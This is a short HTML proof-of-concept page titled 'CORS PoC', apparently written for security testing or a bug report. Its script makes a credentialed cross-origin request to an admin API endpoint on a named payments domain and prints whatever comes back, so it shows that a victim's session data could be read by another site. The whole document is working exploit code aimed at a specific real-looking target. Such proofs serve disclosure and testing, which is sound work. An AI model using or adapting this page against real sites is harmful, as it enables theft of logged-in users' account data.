<!DOCTYPE html>
<html>
<body>
<h2>CORS PoC</h2>
<pre id="output">Loading...</pre>

<script>
fetch("https://api-admin.paydo.com/v1/request/info", {
    method: "GET",
    credentials: "include" 
})
.then(r => r.text())
.then(data => {
    document.getElementById("output").textContent = data;
})
.catch(e => {
    document.getElementById("output").textContent = "Error: " + e;
});
</script>

</body>
</html>
